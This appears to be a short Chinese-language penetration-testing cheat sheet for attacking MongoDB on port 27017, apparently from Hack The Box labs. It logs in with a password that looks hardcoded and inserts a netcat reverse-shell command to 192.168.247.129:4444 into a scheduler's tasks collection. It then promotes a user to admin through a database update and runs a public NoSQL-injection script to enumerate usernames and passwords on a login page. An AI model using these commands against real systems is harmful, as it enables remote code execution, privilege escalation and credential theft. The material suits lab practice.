# 27017（mongodb）

1. 手动查询

```bash
客户端：mongo

mongo -u mark -p 5AYRft73VtFpc84k scheduler   ---db 查看库信息
show collections       ----show tables;查看已存在的表
db.tasks.find({})     ----查看一下表内容,现在表中无文档
db.tasks.insert({cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.247.129 4444 >/tmp/f"})   ----将反弹shell插入文档
db.getCollectionNames() //搜集user
利用已经是admin用户给其他用户赋权
db.users.update({"_id": "CNT3t4RJkHZFegE3m"}, { $set: { "roles" : ["admin"]}}) 
```

1. 脚本爆破

```bash
1. 如果存在sql注入，直接爆，没什么说的，脚本如下
https://raw.githubusercontent.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/master/nosqli-user-pass-enum.py
2. 执行爆破
python mongo.py -m post -up username -pp password -op login:login -u http://staging-order.mango.htb/ -ep username
python mongo.py -m post -up username -pp password -op login:login -u http://staging-order.mango.htb/ -ep password
```
